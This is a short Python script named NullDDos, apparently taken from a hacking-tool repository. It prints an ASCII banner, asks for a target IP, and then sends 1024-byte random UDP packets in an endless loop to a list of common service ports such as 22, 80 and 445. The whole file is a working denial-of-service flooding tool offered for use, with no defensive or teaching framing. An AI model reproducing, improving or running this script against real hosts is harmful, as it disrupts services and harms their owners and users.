#!/usr/bin/python3 
# NullDDos v 1.0
# Coded by: NullHACKR
# Github: https://github.com/NullHACKR/NullDDos
#
# import lib
#
import socket
import os
import sys
import random
import time
#
# colors
#
g = '\033[32m'
r = '\033[31m'
y = '\033[93m'
b = '\033[36m'
os.system("clear")
#
# banner
#
print(r+"""

	 /$$   /$$           /$$ /$$ /$$$$$$$  /$$$$$$$                     
	| $$$ | $$          | $$| $$| $$__  $$| $$__  $$                    
	| $$$$| $$ /$$   /$$| $$| $$| $$  \ $$| $$  \ $$  /$$$$$$   /$$$$$$$
	| $$ $$ $$| $$  | $$| $$| $$| $$  | $$| $$  | $$ /$$__  $$ /$$_____/
	| $$  $$$$| $$  | $$| $$| $$| $$  | $$| $$  | $$| $$  \ $$|  $$$$$$ 
	| $$\  $$$| $$  | $$| $$| $$| $$  | $$| $$  | $$| $$  | $$ \____  $$
	| $$ \  $$|  $$$$$$/| $$| $$| $$$$$$$/| $$$$$$$/|  $$$$$$/ /$$$$$$$/
	|__/  \__/ \______/ |__/|__/|_______/ |_______/  \______/ |_______/ """)

print(g+"""                              NullDDos v 2.0  
""")

#
# logo
#
print(b+"""  CODED BY : NullHACKR""")
print(y+"""  GITHUB : NullHACKR""")
print(r)
#
# input
#


ip = input("  TARGET IP : ")
port = [21, 22, 23, 25, 53, 80, 111,  139, 445, 512, 513, 514, 8080, 4444]
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
byte = random._urandom(1024)
print(y)

if ip == "":
      print(r+"Invalid IP")
else:
       sent = 0
       for lport in port:
            print("[-] Sending packet through port [:)]")
            print(lport)
            time.sleep(0.1)
       print(r+"[+] Attack Starting.....")
       time.sleep(1)
       while True:
                   for lport in port:
                        print(b)
                        s.sendto(byte,(ip,lport))
                        sent = sent + 1
                        print(f"sent {sent} packet on ip {ip} through port {lport}")

